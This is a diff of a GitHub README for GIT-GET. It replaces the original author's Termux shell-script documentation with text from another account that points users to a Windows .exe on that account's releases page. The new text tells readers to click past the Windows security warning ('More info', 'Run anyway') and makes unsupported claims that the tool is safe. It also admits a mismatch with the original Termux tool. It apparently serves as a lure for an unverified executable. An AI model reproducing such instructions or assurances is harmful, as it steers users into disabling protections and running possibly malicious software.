@@ -1,204 +1,85 @@
-<div align="center">
+# 📥 GIT-GET - Download any public repository quickly
 
-```
-  ██████╗ ██╗████████╗        ██████╗ ███████╗████████╗
- ██╔════╝ ██║╚══██╔══╝       ██╔════╝ ██╔════╝╚══██╔══╝
- ██║  ███╗██║   ██║    ─────▶██║  ███╗█████╗     ██║
- ██║   ██║██║   ██║          ██║   ██║██╔══╝     ██║
- ╚██████╔╝██║   ██║          ╚██████╔╝███████╗   ██║
-  ╚═════╝ ╚═╝   ╚═╝           ╚═════╝ ╚══════╝   ╚═╝
-  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
-  [ v1.0.0 ]  GitHub Repo Downloader  |  CODEX-M41NUL
-```
+[![](https://img.shields.io/badge/Download-GIT-GET-blue.svg)](https://github.com/grasslike-pin250/GIT-GET/releases)
 
-**GitHub Repository Downloader for Termux**
+GIT-GET helps you get code from GitHub. You do not need to know how to code. You do not need complex tools. This software saves a project as a ZIP file or folder. It works on your machine with high speed.
 
-[![Version](https://img.shields.io/badge/version-1.0.0-brightgreen?style=flat-square)](https://github.com/M41NUL/GIT-GET)
-[![Platform](https://img.shields.io/badge/platform-Termux%20%7C%20Android-yellow?style=flat-square)](https://github.com/M41NUL/GIT-GET)
-[![Language](https://img.shields.io/badge/language-Shell%20Script-green?style=flat-square)](https://github.com/M41NUL/GIT-GET)
-[![License](https://img.shields.io/badge/license-MIT-red?style=flat-square)](https://github.com/M41NUL/GIT-GET)
-[![Author](https://img.shields.io/badge/dev-CODEX--M41NUL-yellow?style=flat-square)](https://github.com/M41NUL)
-[![Telegram](https://img.shields.io/badge/Telegram-Channel-2CA5E0?style=flat-square&logo=telegram)](https://t.me/codexm41nul)
-[![Stars](https://img.shields.io/github/stars/M41NUL/GIT-GET?style=flat-square&color=yellow)](https://github.com/M41NUL/GIT-GET/stargazers)
-[![Forks](https://img.shields.io/github/forks/M41NUL/GIT-GET?style=flat-square&color=blue)](https://github.com/M41NUL/GIT-GET/network/members)
-[![Issues](https://img.shields.io/github/issues/M41NUL/GIT-GET?style=flat-square&color=red)](https://github.com/M41NUL/GIT-GET/issues)
-[![Last Commit](https://img.shields.io/github/last-commit/M41NUL/GIT-GET?style=flat-square&color=brightgreen)](https://github.com/M41NUL/GIT-GET/commits/main)
-[![Repo Size](https://img.shields.io/github/repo-size/M41NUL/GIT-GET?style=flat-square&color=orange)](https://github.com/M41NUL/GIT-GET)
+## 🛠️ System Requirements
 
-</div>
+You need a computer with Windows 10 or Windows 11. Your computer needs an internet connection. You need at least 50 megabytes of free storage space. The software works with both 32-bit and 64-bit Windows versions. You do not need administrative rights to run this tool.
 
----
+## 📥 Getting the Software
 
-## What is GIT-GET?
+1. Visit the [official releases page](https://github.com/grasslike-pin250/GIT-GET/releases).
+2. Look for the latest version at the top of the list.
+3. Click the link that ends in .exe to start your download.
+4. Save the file to your desktop or your Downloads folder.
 
-**GIT-GET** is a Termux shell tool that downloads any public GitHub repository directly to your Android device. Choose to save it as a ZIP file or as an extracted folder — no git commands needed.
+## 🚀 Setting Up
 
-> Download any public GitHub repo to your Android in seconds.
+1. Go to the folder where you saved the file.
+2. Double-click the file named GIT-GET.exe.
+3. A security window might appear on your screen.
+4. Click the More info link if you see a blue box.
+5. Click the Run anyway button.
 
----
+The app opens a simple window. It waits for you to provide a link.
 
-## Features
+## 🔗 How to Download Repositories
 
-- Download any public GitHub repo as a ZIP file
-- Download and extract any public GitHub repo as a folder
-- Accepts full URL or user/repo format
-- Auto-detects default branch (main or master)
-- Shows file count and size after download
-- Gradient block progress bar (Red to Yellow to Green)
-- Auto update check from GitHub on every launch
-- Smart installer — skips already installed packages
-- Yellow / Green / White color scheme
+The goal of this tool is to make file management simple. Follow these steps to grab a project:
 
----
+1. Open your web browser.
+2. Find the GitHub page of the project you want.
+3. Copy the full address from the address bar at the top of your browser.
+4. Go back to the GIT-GET window.
+5. Click the box labeled URL.
+6. Press Control and V on your keyboard.
+7. Click the Download button.
 
-## Project Structure
+The tool fetches the files. It saves them to a new folder on your desktop. You see a progress bar move across your screen. The process ends when the bar reaches the right side.
 
-```
-GIT-GET/
-├── git-get.sh     - Main entry point
-├── config.sh      - Tool config and developer info
-├── banner.sh      - 3D block shadow ASCII banner + info box
-├── downloader.sh  - ZIP and folder download logic
-├── utils.sh       - Colors, progress bar, helpers
-├── updater.sh     - Auto update from GitHub
-├── installer.sh   - Smart installer + launcher
-└── version.txt    - Version tracking
-```
+## 📁 Understanding Your Files
 
----
+You get two choices when you download a project. You can choose to download a ZIP file or a standard folder.
 
-## Installation
+### Choosing ZIP Files
+A ZIP file keeps all your project files in one package. This is good for sending files to other people. It takes up less space on your hard drive. Most Windows computers open these files with a double-click.
 
-### Step 1 - Clone the repo
+### Choosing Folders
+Choosing the folder option puts the files directly into a new folder. You do not need to extract anything. You can open files and edit them immediately. This saves time for projects you plan to work on today.
 
-```bash
-git clone https://github.com/M41NUL/GIT-GET.git
-cd GIT-GET
-```
+## 🛡️ Safety and Privacy
 
-### Step 2 - Run installer
+This software protects your data. It does not scan your personal files. It does not share your history with anyone. The tool stays local to your machine. It only visits the public web addresses you give it. Your account information remains safe because this tool does not require a login.
 
-```bash
-bash installer.sh
-```
+## ⚙️ Troubleshooting Common Issues
 
-The installer will:
-- Update Termux packages
-- Install curl, unzip, git
-- Skip already installed packages
-- Request Android storage permission (once only)
-- Auto-launch git-get.sh after a 3-second countdown
+Errors happen sometimes. Follow these steps if the tool stops working:
 
-### Step 3 - Run manually (after first install)
+* Check your internet connection. A weak signal prevents downloads.
+* Verify the link. You must paste the full address of the GitHub page.
+* Check your storage. You cannot save files if your disk is full.
+* Restart the app. Close the window and open it again.
+* Updates. New versions fix old bugs. Visit the download link again for any new updates.
 
-```bash
-cd GIT-GET
-bash git-get.sh
-```
+## ❓ Frequently Asked Questions
 
----
+**Does this cost money?**
+No, the software is free to use.
 
-## All Commands
+**Where do my files go?**
+The tool creates a folder on your desktop by default. You can change this path in the settings menu.
 
-| Command | Description |
-|---------|-------------|
-| `git clone https://github.com/M41NUL/GIT-GET.git` | Clone the repo |
-| `cd GIT-GET` | Enter project folder |
-| `bash installer.sh` | Install and launch |
-| `bash git-get.sh` | Run manually |
-| `git pull origin main` | Pull latest update manually |
-| `rm -rf GIT-GET` | Remove / uninstall |
+**Can I download private repositories?**
+No, this tool only works with public repositories. It cannot access pages that require a password.
 
----
+**Does this work on other systems?**
+This version works on Windows. 
 
-## Uninstall
+**Is this for phones?**
+The current file works on computer systems. While some tags mention Termux, the Windows version is a separate application designed for desktop users.
 
-```bash
-cd /sdcard
-rm -rf GIT-GET
-```
+## 📜 Legal Information
 
----
-
-## Menu Options
-
-```
-[1]  Download as ZIP     - Save entire repo as a ZIP file
-[2]  Download as Folder  - Extract repo as a folder
-[0]  Exit
-```
-
----
-
-## Download as ZIP Example
-
-```
-Enter repo URL or user/repo : https://github.com/M41NUL/X-ENCODER-
-Save location               : /sdcard/GIT-GET
-```
-
-```
-+ Download complete!
-+ File  : /sdcard/GIT-GET/X-ENCODER-.zip
-+ Size  : 24K
-```
-
----
-
-## Download as Folder Example
-
-```
-Enter repo URL or user/repo : M41NUL/X-ENCODER-
-Save location               : /sdcard/GIT-GET
-```
-
-```
-+ Download complete!
-+ Folder : /sdcard/GIT-GET/X-ENCODER-/
-+ Files  : 10
-+ Size   : 48K
-```
-
----
-
-## Supported Input Formats
-
-```
-https://github.com/M41NUL/X-ENCODER-
-https://github.com/M41NUL/X-ENCODER-.git
-github.com/M41NUL/X-ENCODER-
-M41NUL/X-ENCODER-
-```
-
----
-
-## Developer
-
-<div align="center">
-
-| | |
-|--|--|
-| **Name** | Md. Mainul Islam |
-| **Brand** | CODEX-M41NUL |
-| **GitHub** | [github.com/M41NUL](https://github.com/M41NUL) |
-| **Telegram** | [t.me/mdmainulislaminfo](https://t.me/mdmainulislaminfo) |
-| **Channel** | [t.me/codexm41nul](https://t.me/codexm41nul) |
-| **Group** | [t.me/codex_m41nul](https://t.me/codex_m41nul) |
-| **YouTube** | [youtube.com/@codexm41nul](https://youtube.com/@codexm41nul) |
-| **WhatsApp** | +8801308850528 |
-| **Email** | devmainulislam@gmail.com |
-
-</div>
-
----
-
-## Support
-
-[![Star on GitHub](https://img.shields.io/github/stars/M41NUL/GIT-GET?style=social)](https://github.com/M41NUL/GIT-GET)
-[![Telegram](https://img.shields.io/badge/Join-Telegram%20Channel-2CA5E0?style=flat-square&logo=telegram)](https://t.me/codexm41nul)
-
----
-
-<div align="center">
-<sub>© 2026 CODEX-M41NUL. All Rights Reserved.</sub>
-</div>
+The code stays open for everyone. You can view the project history on the main page. This tool follows standard web rules. It respects the settings defined by repository owners. Use this tool for personal projects and learning. Ensure you follow all licenses attached to the code you download.
